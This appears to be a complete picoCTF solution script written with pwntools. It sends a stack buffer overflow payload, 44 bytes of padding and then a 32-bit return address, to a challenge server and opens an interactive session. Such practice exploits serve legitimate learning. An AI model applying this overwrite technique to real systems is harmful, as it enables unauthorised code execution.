from pwn import *

r = remote("saturn.picoctf.net", 61990)

payload = b'a'*44 + p32(0x080491f6)
r.sendline(payload)
r.interactive()